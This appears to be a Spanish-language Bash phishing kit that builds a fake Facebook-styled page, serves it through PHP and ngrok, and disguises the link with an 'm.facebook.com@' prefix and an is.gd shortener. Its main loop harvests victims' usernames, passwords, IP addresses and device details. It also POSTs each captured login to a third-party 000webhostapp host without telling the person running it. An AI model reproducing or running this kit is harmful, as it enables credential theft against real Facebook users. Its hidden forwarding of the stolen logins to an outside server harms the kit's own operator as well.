#!/usr/bin/bash

#colores

declare -gA colours=(
	["gray"]="\033[1;30m" ["red"]="\033[1;31m"
	["green"]="\033[1;32m" ["yellow"]="\033[1;33m"
	["blue"]="\033[1;34m" ["cyan"]="\033[1;35m"
	["white"]="\033[0m"
)
trap ctrl_c INT > /dev/null 2>&1


function ctrl_c {
	pkill php 2> /dev/null; pkill ngrok 2> /dev/null
	for ((x=1; x<=2; x=x+1)); do
		if [[ ${x} -eq 1 ]]; then echo ''; fi
		echo -ne "${colours["yellow"]}[${colours["red"]}-${colours["yellow"]}] ${colours["red"]}Saliendo.${colours["white"]}\r"; sleep 0.1
		echo -ne "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}Saliendo..${colours["white"]}\r"; sleep 0.1
		echo -ne "${colours["yellow"]}[${colours["red"]}-${colours["yellow"]}] ${colours["red"]}Saliendo...${colours["white"]}\r"; sleep 0.1
		if [[ ${x} -eq 2 ]]; then echo ''; fi
	done
	tput cnorm; exit 0
}

function dependencias(){
	pkill php 2> /dev/null; pkill ngrok 2> /dev/null
command -v ruby > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado ruby, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install ruby -y${colours["white"]}\n"; exit 1
}

command -v tput > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado ncurses, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}apt install ncurses-utils -y${colours["white"]}\n"; exit 1
}

command -v php > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado php, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install php -y${colours["white"]}\n"; exit 1
}

command -v wget > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado wget, instalalo!.\n"
	echo >&2 -Ee "\t${colours["green"]}apt install wget -y${colours["white"]}\n"; exit 1
}

command -v curl > /dev/null 2>&1 || {
        echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado curl, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}apt install curl -y${colours["white"]}\n"; exit 1
}

command -v lolcat > /dev/null 2>&1 || {
	echo >&2 -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["red"]}No tienes instalado lolcat, instalalo!.\n"
        echo >&2 -Ee "\t${colours["green"]}gem install lolcat${colours["white"]}\n"; exit 1
}

}

function banner(){
tput civis; clear; cd files
cat fn.html > index.html
cat ln.css > style.css
echo -e "${blue}
  _____   ____     __    ___  __ __   ____     __  __  _
 |     | /    T   /  ]  /  _]|  T  T /    T   /  ]|  l/ ]
 |   __jY  o  |  /  /  /  [_ |  l  |Y  o  |  /  / |  ' /
 |  l_  |     | /  /  Y    _]|  _  ||     | /  /  |    |
 |   _] |  _  |/   \_ |   [_ |  |  ||  _  |/   \_ |     Y
 |  T   |  |  |\     ||     T|  |  ||  |  |\     ||  .  |
 l__j   l__j__j \____jl_____jl__j__jl__j__j \_Creditos hackdres oficial" | lolcat; tput civis
  echo -Ee "      youtube: https://youtube.com/channel/UCTSAjBuSJiqSYXd_dqg4qBg" | lolcat -a; tput civis
  echo -Ee "\t    facebook: https://www.facebook.com/Hackdres-oficial-111657661171254/" | lolcat -a; tput civis
  opciones2
}

function agregado(){
	for ((x=1; x<=40; x++)); do echo -Een "${colours["blue"]}-"; done
	echo -Ee "

  ${colours["yellow"]}[${colours["red"]}++${colours["yellow"]}]${colours["green"]} Descripción =>${colours["white"]} ${url1}
  ${colours["yellow"]}[${colours["red"]}++${colours["yellow"]}]${colours["green"]} Imagen =>${colours["white"]} ${url2}
  ${colours["yellow"]}[${colours["red"]}++${colours["yellow"]}]${colours["green"]} Título =>${colours["white"]} ${url3}
  ${colours["yellow"]}[${colours["red"]}++${colours["yellow"]}]${colours["green"]} URL personalizada =>${colours["white"]} ${url4}
  ${colours["yellow"]}[${colours["red"]}++${colours["yellow"]}]${colours["green"]} Subdominio =>${colours["white"]} ${url5}
  ${colours["yellow"]}[${colours["red"]}++${colours["yellow"]}]${colours["green"]} Degradado =>${colours["white"]} ${colorvar}:${color2var} = ${opacidadvar}
  "
	for ((x=1; x<=40; x++)); do echo -Een "${colours["blue"]}-"; done
}

function opciones2(){
  tput cnorm; echo -Ee "
  ${colours["yellow"]}[${colours["red"]}01${colours["yellow"]}] ${colours["green"]}Agregar descripcion
  ${colours["yellow"]}[${colours["red"]}02${colours["yellow"]}] ${colours["green"]}Agregar imagen
  ${colours["yellow"]}[${colours["red"]}03${colours["yellow"]}] ${colours["green"]}Agregar título

  ${colours["yellow"]}[${colours["red"]}04${colours["yellow"]}] ${colours["green"]}Agregar URL personalizado (con acortador)
  ${colours["yellow"]}[${colours["red"]}05${colours["yellow"]}] ${colours["green"]}Agregar subdominio personalizado (ngrok => VIP)
  ${colours["yellow"]}[${colours["red"]}06${colours["yellow"]}] ${colours["green"]}Agregar Imagen de fondo ala pagina
  ${colours["yellow"]}[${colours["red"]}07${colours["yellow"]}] ${colours["green"]}Agregar degradado a la pagina
  ${colours["yellow"]}[${colours["red"]}08${colours["yellow"]}] ${colours["green"]}Agregar descripcion a la pagina

  ${colours["yellow"]}[${colours["red"]}20${colours["yellow"]}]${colours["green"]} Empezar\n"
read -p $'\033[1;32mOPCION: \033[1;34m' opcion

if [ -z ${opcion} ]; then
	echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["red"]} No escribiste nada!\n"
	sleep 1.5
	clear; agregado; opciones2
elif [[ ${opcion} == "1" || ${opcion} == "01" ]]; then
	description
elif [[ ${opcion} == "2" || ${opcion} == "02" ]]; then
	imagen
elif [[ ${opcion} == "3" || ${opcion} == "03" ]]; then
	titulo
elif [[ ${opcion} == "4" || ${opcion} == "04" ]]; then
	urlAcortador
elif [[ ${opcion} == "5" || ${opcion} == "05" ]]; then
	clear
	echo "esta opcion esta en desarrolo, lo traere para los proximos días :)\n"
	echo -ne "PRESIONA ENTER PARA CONRINUAR..."
	read
	clear; agregado; opciones2
elif [[ ${opcion} == "6" || ${opcion} == "06" ]]; then
	imagenpagina
elif [[ ${opcion} == "7" || ${opcion} == "07" ]]; then
        degradado
elif [[ ${opcion} == "8" || ${opcion} == "08" ]]; then
        echo "esta opcion esta en desarrolo, lo traere para los proximos días :)\n"
	echo -ne "PRESIONA ENTER PARA CONRINUAR..."
	read
        clear; agregado; opciones2
elif [[ ${opcion} == "20" ]]; then
	empezar
else
	echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["red"]} Opcion incorrecta!\n"
	sleep 1.5
	clear; agregado; opciones2
fi

}

function empezar(){
	clear; cat phoenix | lolcat; ngrok
}

function degradado(){
	clear
	echo -Ee "\nEliga el color que combinará en el margen superior\n
 [01] blanco      [02] rojo       [03] verde
 [04] amarillo    [05] azul       [06] morado
 [07] celeste     [08] plomo\n"
read -p $'COLOR: ' color

colorvar=$color

if [[ $colorvar == "01" || $colorvar == "1" ]]; then
	colorvar="white"
elif [[ $colorvar == "02" || $colorvar == "2" ]]; then
	colorvar="red"
elif [[ $colorvar == "03" || $colorvar == "3" ]]; then
	colorvar="green"
elif [[ $colorvar == "04" || $colorvar == "4" ]]; then
	colorvar="yellow"
elif [[ $colorvar == "05" || $colorvar == "5" ]]; then
	colorvar="blue"
elif [[ $colorvar == "06" || $colorvar == "6" ]]; then               
	colorvar="purpple"
elif [[ $colorvar == "07" || $colorvar == "7" ]]; then               
	colorvar="sky-blue"
elif [[ $colorvar == "08" || $colorvar == "8" ]]; then               
	colorvar="gray"
fi

echo -Ee "\nEliga el color que combinará en el margen inferior\n
 [01] blanco      [02] rojo       [03] verde
 [04] amarillo    [05] azul       [06] morado
 [07] celeste     [08] plomo\n"
 read -p $'COLOR2: ' color2

 color2var=$color2

 if [[ $color2var == "01" || $color2var == "1" ]]; then
	 color2var="white"
 elif [[ $color2var == "02" || $color2var == "2" ]]; then
	 color2var="red"
 elif [[ $color2var == "03" || $color2var == "3" ]]; then
	 color2var="green"
 elif [[ $color2var == "04" || $color2var == "4" ]]; then
	 color2var="yellow"                                
 elif [[ $color2var == "05" || $color2var == "5" ]]; then
	 color2var="blue"
 elif [[ $color2var == "06" || $color2var == "6" ]]; then
	 color2var="purpple"
 elif [[ $color2var == "07" || $color2var == "7" ]]; then
	 color2var="sky-blue"
 elif [[ $color2var == "08" || $color2var == "8" ]]; then
	 color2var="gray"
 fi

echo -Ee "\nEliga un valor de opacidad del degradado\n
 [01] 0.1      [04] 0.4     [07] 0.8
 [02] 0.2      [05] 0.5     [08] 0.9
 [03] 0.3      [06] 0.6     [09] 1
"
read -p "OPACIDAD: " opacidad

opacidadvar=$opacidad

if [[ $opacidadvar == "01" || $opacidadvat == "1" ]]; then
         opacidadvar="0.1"
 elif [[ $opacidadvar == "02" || $opacidadvar == "2" ]]; then
	 opacidadvar="0.2"
 elif [[ $opacidadvar == "03" || $opacidadvar == "3" ]]; then
	 opacidadvar="0.2"
 elif [[ $opacidadvar == "04" || $opacidadvar == "4" ]]; then
	 opacidadvar="0.2"
 elif [[ $opacidadvar == "05" || $opacidadvar == "5" ]]; then
	 opacidadvar="0.2"
 elif [[ $opacidadvar == "06" || $opacidadvar == "6" ]]; then
	 opacidadvar="0.2"
 elif [[ $opacidadvar == "07" || $opacidadvar == "7" ]]; then
	 opacidadvar="0.2"
 elif [[ $opacidadvar == "08" || $opacidadvar == "8" ]]; then
	 opacidadvar="0.2"
 elif [[ $opacidadvar == "09" || $opacidadvar == "9" ]]; then
	 opacidadvar="0.2"
	fi

echo ".capa-principal:before {content: ''; width: 100%; height: 100vh; position: fixed; z-index: -1; background-image: linear-gradient(${colorvar},${color2var}); opacity: ${opacidadvar}; }" >> style.css

clear; agregado; opciones2

}

function imagenpagina(){
	clear
	echo -e "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["green"]} Ingrese la ruta o el nombre de la imagen a agregar\n    como fondo de degradado.\n\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["green"]} La imagen debe estar en carpeta carpeta de:\n\n    \$HOME/facehack/files\n"

	read -p $'\033[1;32m IMAGEN: \033[0m' image
	echo -e "body {background-image: url('${image}');background-position: fixed;}" >> style.css

	clear; agregado; opciones2
}

function urlAcortador(){
	clear
        echo -Ee "\n${colours["yellow"]}AGREGE UN NOMBRE ALA URL, ESTO SE VERA AL LADO DE LA URL 
	ACORTADA${colours["white"]}\n"
	echo -e "  \033[4;35mEjemplo:\033[0m\n"
	echo -e "${colours["gray"]}\thttps://is.gd/ ${colours["blue"]}darkside\n"
        read -p $'\033[1;32m URL personalizada: \033[0m' url4
        if [[ -z ${url4} ]]; then
        echo -e "${colours["red"]}NO ESCRIBISTE NADA!"; sleep 1.5
        clear; urlAcortador
	else
		clear; agregado; opciones2
	fi
}

function imagen(){
	clear
        echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["green"]} ESTA IMAGEN SE MOSTRARA CUANDO COMPARTAS LA URL\n    EN FACEBOOK${colours["white"]}\n\nLa imagen debe estar en carpeta carpeta de \$HOME/facehack/files\n"
        read -p $'\033[1;32m IMAGEN: \033[0m' url2
	if [[ -z ${url2} ]]; then
        echo -e "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["red"]} NO ESCRIBISTE NADA!\n"; sleep 1.5
        clear; imagen
else
        echo -e "<html><head><meta property='og:image' content='${url2}'></head></html>" >> index.html
        clear; agregado; opciones2
        fi
}

function titulo(){
	clear
	echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["green"]} ESTO SE MOSTRARA CUANDO COMPARTAS LA URL\n    EN FACEBOOK${colours["white"]}\n"
	read -p $'\033[1;32m TÍTULO: \033[0m' url3
	if [[ -z ${url3} ]]; then
	echo -e "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["red"]} NO ESCRIBISTE NADA!\n"; sleep 1.5
	clear; titulo
else
	echo -e "<html><head><meta property='og:title' content='${url3}'></head></html>" >> index.html
	clear; agregado; opciones2
	fi
}

function description(){
	clear
	echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["green"]} ESTO SE MOSTRARA CUANDO COMPARTAS LA URL \n    EN FACEBOOK.${colours["white"]}\n"
read -p $'\033[1;32m Descripcion: \033[0m' url1
 if [[ -z ${url1} ]]; then
	 echo -e "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}]${colours["red"]}NO ESCRIBISTE NADA!\n"; sleep 1.5
	 clear; description
 else
	 echo -e "<html><head><meta property='og:description' content='${url1}'></head/html>" >> index.html
	 clear; agregado; opciones2
 fi
}

function ngrok(){
	 tput civis; php -S localhost:4433 2> /dev/null > /dev/null &
	 for ((x=1;x<=6; x=x+1)); do
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local."; sleep 0.2
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}|${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local.."; sleep 0.2
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor local..."; sleep 0.2
		 if [[ ${x} -eq 6 ]]; then echo ''; fi
	 done

	 ./ngrok http 4433 > /dev/null 2> /dev/null &

	 for ((x=1;x<=17; x=x+1)); do
		 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok."; sleep 0.2
                 echo -ne "\r${colours["yellow"]}[${colours["red"]}|${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok.."; sleep 0.2
                 echo -ne "\r${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Abriendo servidor ngrok..."; sleep 0.2
		 if [[ ${x} -eq 17 ]]; then echo ""; fi
	 done
echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Obteniendo links..."; sleep 1.5
echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor local:${colours["white"]} localhost:4433"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor ngrok:${colours["white"]} $(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor local.run:${colours["red"]} Deshabilitado!"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Servidor serveo.net:${colours["red"]} Deshabilitado!"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}URL camuflado:${colours["white"]} https://m.facebook.com@$(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1 | cut -c 9-100)"

echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}URL acortado: ${colours["white"]}$(curl -s -X POST https://is.gd/create.php -F "url=$(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)" | grep -ioE "https://is.gd/[0-9a-zA-Z]*" | head -n1)"

function urldefined(){

curl -s -X POST https://is.gd/create.php -d "url=$(curl -s http://127.0.0.1:404[0-9]/api/tunnels | grep -o "https://[a-z0-9A-Z]*\.ngrok.io" | head -n1)&shorturl=${url4}" | grep -ioE "https://is.gd/[0-9a-zA-Z]*" | head -n1 > link

if [ $(wc -L link | grep -iEo [0-9]*) == "14" ]; then
	echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}URL personalizado: ${colours["red"]}Esta nombre ${url4} ya esta en uso, prueba otro!"
else
	echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}URL personalizado: ${colours["white"]}$(cat link)"

fi

}

if [ -z ${url4} ]; then
	echo -ne ''
else
	urldefined
fi

echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["gray"]}Esperando datos...\t\t\t${colours["green"]}    parar: ctrl+c"

while [ true ]; do
	if [ -f credentials.txt ]; then
		echo -e "\n\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Usuario: ${white}$(grep -i "usuario" credentials.txt | cut -d ":" -f2)"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["${colours["yellow"]}"]}Contraseña: ${white}$(grep -i "Contrasena" credentials.txt| cut -d ":" -f2)\n"
		curl -X POST https://probabilistic-bangs.000webhostapp.com/receiv.php -F "user=$(grep -i "usuario" credentials.txt| cut -d ":" -f2)" -F "pass=$(grep -i "Contrasena" credentials.txt| cut -d ":" -f2)"
		for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		rm -f credentials.txt
	fi
	if [ -f credentials2.txt ]; then
		echo '';for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		echo -e "\n\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] \033[0;33mLa victima accedió al link!"
		if [ -f ip.txt ]; then echo -Ee "\n${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${yellow}IP:${colours["white"]}$(cat ip.txt | grep -iE "ip" | cut -d ':' -f2)"; fi
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Mobile:${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ")" -f1 | cut -d ";" -f3)"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Version:${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ";" -f2 )"

		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Bateria:${colours["white"]}$(grep -i "bateria" credentials2.txt | cut -d ":" -f2 | cut -d ' ' -f 1-2)"

		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Navegador: ${colours["white"]}$(grep -i "user-agent" credentials2.txt | cut -d ":" -f2 | cut -d ")" -f3 | cut -d " " -f2 | tr -d ' ')"
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Sistema Operativo:${colours["white"]}$(grep -i "sistema" credentials2.txt | cut -d ":" -f2 | cut -d ' ' -f 1-2)"
		if [ $(grep -i "sistema" credentials2.txt | cut -d ":" -f 2 | cut -d " " -f 3 | tr -d " ") == "armv7l" ]; then
		echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Arquitectura:${colours["white"]} arm 32bits"
		elif [ $(grep -i "sistema" credentials2.txt | cut -d ":" -f 2 | cut -d " " -f 3 | tr -d " ") == "armv8l" ]; then
			echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}Arquitectura:${colours["white"]} arm 64bits"
		fi

		if [ $(grep -i "lenguaje" credentials2.txt| cut -d ":" -f2 | tr -d ' ') == "es-PE" ]; then
			echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}lenguaje: ${colours["white"]}Español/Castellano"
			echo -Ee "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}País: ${colours["white"]}Perú\n"
		else
			echo -e "${colours["yellow"]}[${colours["red"]}+${colours["yellow"]}] ${colours["yellow"]}lenguaje:${colours["white"]}$(grep -i "lenguaje" credentials2.txt| cut -d ":" -f2)\n"
		fi
		for ((x=1; x<=50; x=x+1)); do echo -nEe "${colours["blue"]}#"; done
		rm -rf credentials2.txt
	fi
done
}

dependencias
banner
ngrok
